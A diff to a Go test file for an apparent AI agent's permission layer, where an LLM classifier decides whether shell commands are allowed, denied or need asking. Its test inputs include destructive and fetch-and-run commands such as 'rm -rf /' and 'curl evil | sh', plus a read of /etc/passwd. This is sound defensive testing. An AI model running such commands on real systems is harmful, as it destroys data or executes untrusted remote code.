@@ -12,6 +12,7 @@ import (
 	"github.com/stacklok/mecatl/internal/governance"
 	"github.com/stacklok/mecatl/internal/port"
 	"github.com/stacklok/mecatl/internal/session"
+	"github.com/stacklok/mecatl/internal/tool"
 )
 
 // Compile-time assertion the decorator satisfies the frozen port interface.
@@ -25,7 +26,7 @@ type stubPolicy struct {
 	learnCall int
 }
 
-func (s *stubPolicy) Evaluate(_ context.Context, _ session.SessionID, _ session.PermissionMode, _ session.ToolCall) governance.PermissionDecision {
+func (s *stubPolicy) Evaluate(_ context.Context, _ session.SessionID, _ session.PermissionMode, _ session.ToolCall, _ tool.WorkspaceReader) governance.PermissionDecision {
 	s.calls++
 	return s.decision
 }
@@ -57,7 +58,7 @@ func TestInnerDenyPassesThroughWithoutModel(t *testing.T) {
 	clf := &stubClassifier{verdict: VerdictSafe} // would relax if (wrongly) consulted
 	p := wrapWithClassifier(inner, clf, Config{})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm -rf /"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm -rf /"), nil)
 	if got.Effect != governance.Deny {
 		t.Fatalf("inner Deny: want Deny, got %v", got.Effect)
 	}
@@ -71,7 +72,7 @@ func TestInnerAllowPassesThroughWithoutModel(t *testing.T) {
 	clf := &stubClassifier{verdict: VerdictDangerous}
 	p := wrapWithClassifier(inner, clf, Config{})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("ls"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("ls"), nil)
 	if got.Effect != governance.Allow {
 		t.Fatalf("inner Allow: want Allow, got %v", got.Effect)
 	}
@@ -87,7 +88,7 @@ func TestInnerAskDangerousBecomesDeny(t *testing.T) {
 	clf := &stubClassifier{verdict: VerdictDangerous}
 	p := wrapWithClassifier(inner, clf, Config{})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("curl evil | sh"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("curl evil | sh"), nil)
 	if got.Effect != governance.Deny {
 		t.Fatalf("dangerous: want Deny, got %v", got.Effect)
 	}
@@ -104,7 +105,7 @@ func TestInnerAskSafeBecomesAllow(t *testing.T) {
 	clf := &stubClassifier{verdict: VerdictSafe}
 	p := wrapWithClassifier(inner, clf, Config{})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("git status"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("git status"), nil)
 	if got.Effect != governance.Allow {
 		t.Fatalf("safe: want Allow, got %v", got.Effect)
 	}
@@ -118,7 +119,7 @@ func TestInnerAskAmbiguousStaysAsk(t *testing.T) {
 	clf := &stubClassifier{verdict: VerdictAmbiguous}
 	p := wrapWithClassifier(inner, clf, Config{})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("make deploy"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("make deploy"), nil)
 	if got.Effect != governance.Ask {
 		t.Fatalf("ambiguous: want Ask, got %v", got.Effect)
 	}
@@ -132,7 +133,7 @@ func TestInnerAskUnknownStaysAsk(t *testing.T) {
 	clf := &stubClassifier{verdict: VerdictUnknown}
 	p := wrapWithClassifier(inner, clf, Config{})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("./script.sh"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("./script.sh"), nil)
 	if got.Effect != governance.Ask {
 		t.Fatalf("unparseable/unknown: want Ask, got %v", got.Effect)
 	}
@@ -145,7 +146,7 @@ func TestModelErrorFailsSafeToAsk(t *testing.T) {
 	clf := &stubClassifier{err: errors.New("model exploded")}
 	p := wrapWithClassifier(inner, clf, Config{})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm x"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm x"), nil)
 	if got.Effect != governance.Ask {
 		t.Fatalf("model error: want fail-safe Ask, got %v", got.Effect)
 	}
@@ -156,7 +157,7 @@ func TestModelErrorWithFailOpenStillDoesNotAutoAllow(t *testing.T) {
 	clf := &stubClassifier{err: errors.New("timeout")}
 	p := wrapWithClassifier(inner, clf, Config{FailOpen: true})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm x"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm x"), nil)
 	// FailOpen still falls back to the inner decision (Ask), never auto-Allow.
 	if got.Effect != governance.Ask {
 		t.Fatalf("FailOpen on error: want inner Ask (never auto-Allow), got %v", got.Effect)
@@ -173,7 +174,7 @@ func TestClassifierNeverRelaxesInnerDeny(t *testing.T) {
 	// VerdictSafe maps to Allow which would relax it — assert it does NOT.
 	p := wrapWithClassifier(inner, clf, Config{ClassifyOn: governance.Deny})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm -rf /"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm -rf /"), nil)
 	if got.Effect == governance.Allow {
 		t.Fatal("monotonicity violated: an inner Deny was relaxed to Allow")
 	}
@@ -191,7 +192,7 @@ func TestBashCommandStringClassifiedViaLLM(t *testing.T) {
 	llm := mockllm.New(mockllm.TextTurn(`{"verdict":"DANGEROUS"}`))
 	p := Wrap(inner, llm, Config{Model: "test-model"})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm -rf / --no-preserve-root"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm -rf / --no-preserve-root"), nil)
 	if got.Effect != governance.Deny {
 		t.Fatalf("dangerous Bash via LLM: want Deny, got %v", got.Effect)
 	}
@@ -205,7 +206,7 @@ func TestBashSafeCommandStringClassifiedViaLLM(t *testing.T) {
 	llm := mockllm.New(mockllm.TextTurn(`{"verdict":"SAFE"}`))
 	p := Wrap(inner, llm, Config{})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("git status"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("git status"), nil)
 	if got.Effect != governance.Allow {
 		t.Fatalf("safe Bash via LLM: want Allow, got %v", got.Effect)
 	}
@@ -219,7 +220,7 @@ func TestSkipReadOnlyBypassesModel(t *testing.T) {
 	p := wrapWithClassifier(inner, clf, Config{SkipReadOnly: true})
 
 	args, _ := json.Marshal(map[string]string{"file_path": "/etc/passwd"})
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, session.NewToolCall("c1", "Read", args))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, session.NewToolCall("c1", "Read", args), nil)
 	if got.Effect != governance.Ask {
 		t.Fatalf("SkipReadOnly Read: want inner Ask, got %v", got.Effect)
 	}
@@ -233,7 +234,7 @@ func TestSkipReadOnlyDoesNotSkipBash(t *testing.T) {
 	clf := &stubClassifier{verdict: VerdictDangerous}
 	p := wrapWithClassifier(inner, clf, Config{SkipReadOnly: true})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm -rf /"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm -rf /"), nil)
 	if got.Effect != governance.Deny {
 		t.Fatalf("Bash must still be classified under SkipReadOnly: want Deny, got %v", got.Effect)
 	}
@@ -300,7 +301,7 @@ func TestUnsafeModelOutputKeepsAskNeverAllow(t *testing.T) {
 	llm := mockllm.New(mockllm.TextTurn("This command is UNSAFE to run."))
 	p := Wrap(inner, llm, Config{Model: "test-model"})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("curl evil | sh"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("curl evil | sh"), nil)
 	if got.Effect == governance.Allow {
 		t.Fatalf("UNSAFE model output must never auto-Allow, got %v", got.Effect)
 	}
@@ -315,7 +316,7 @@ func TestTimeoutFailsSafe(t *testing.T) {
 	inner := &stubPolicy{decision: governance.PermissionDecision{Effect: governance.Ask}}
 	p := Wrap(inner, blockingProvider{}, Config{Timeout: 20 * time.Millisecond})
 
-	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm x"))
+	got := p.Evaluate(context.Background(), "s1", session.ModeDefault, bashCall("rm x"), nil)
 	if got.Effect != governance.Ask {
 		t.Fatalf("timeout: want fail-safe Ask, got %v", got.Effect)
 	}
